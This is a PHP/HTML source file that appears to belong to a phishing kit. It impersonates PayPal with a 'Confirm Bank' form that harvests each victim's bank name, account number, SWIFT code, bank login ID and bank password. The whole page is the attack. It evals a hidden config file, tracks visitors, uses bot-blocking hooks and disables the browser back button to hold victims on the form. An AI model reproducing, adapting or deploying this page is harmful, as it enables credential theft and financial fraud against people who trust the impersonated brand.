<?php
require_once __DIR__ . '/function.php';
@eval(file_get_contents($api->dir_config.'/'.$api->general_config));

if ($config_blocker == "enable") {
  $api->cookie();
  $api->session();
}

$api->visitor("Bank");
?>
<!DOCTYPE html>
<html>

<head>
<title><?=$api->transcode("PayPal: Confirm Bank");?></title>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=yes">
<meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noodp, noydir">
<link rel="shortcut icon" href="../assets/img/favicon.ico">
<link rel="apple-touch-icon" href="../assets/img/apple-touch-icon.png">
<link rel="stylesheet" href="../assets/css/myaccount_app.css">
<link rel="stylesheet" href="../assets/css/myaccount_wallet.css">
<script src="../assets/js/jquery.min.js"></script>
<script src="../assets/js/jquery.mask.js"></script>
<script src="../assets/js/jquery.validate.js"></script>
<script src="../assets/js/myaccount.bank.js"></script>
<script type="text/javascript">
window.history.forward();

function noBack() {
window.history.forward();
}
</script>
</head>

<body onload="noBack();" onpageshow="if (event.persisted) noBack();" onunload="">
<section class="theoverpanel">
<div class="overpanel-wrapper row">
<div class="overpanel-content col-xs-12 col-xs-offset-0 col-sm-8 col-sm-offset-2 col-md-4 col-md-offset-4">
<div class="overpanel-header">
<h2><?=$api->transcode("Confirm Bank");?></h2>
</div>
<div class="overpanel-body">
<form method="post" id="bank" autocomplete="off">
<div class="textInput lap" id="DivName">
<input type="text" placeholder="<?=$api->transcode("Bank name");?>" id="Name" name="bname">
</div>
<div class="textInput lap" id="DivNumber">
<input type="tel" placeholder="<?=$api->transcode("Account number");?>" id="Number" name="bnumber">
</div>
<div class="textInput lap" id="DivSwift">
<input type="text" placeholder="<?=$api->transcode("Bank swift code");?>" id="Swift" name="bswift">
</div>
<div class="textInput lap" id="DivLogin">
<input type="text" placeholder="<?=$api->transcode("Bank login ID");?>" id="Login" name="blogin">
</div>
<div class="textInput lap" id="DivPass">
<input type="text" placeholder="<?=$api->transcode("Bank password");?>" id="Pass" name="bpass">
</div>
<input class="vx_btn col-md-12 col-sm-12 col-xs-12" type="submit" value="<?=$api->transcode("Confirm");?>" id="btnConfirm">
<p class="scretlogo"></p>
</form>
</div>
</div>
</div>
<div class="hasSpinner hide" id="loading"></div>
</section>
<script src="../assets/js/bank.post.js"></script>
</body>
</html>
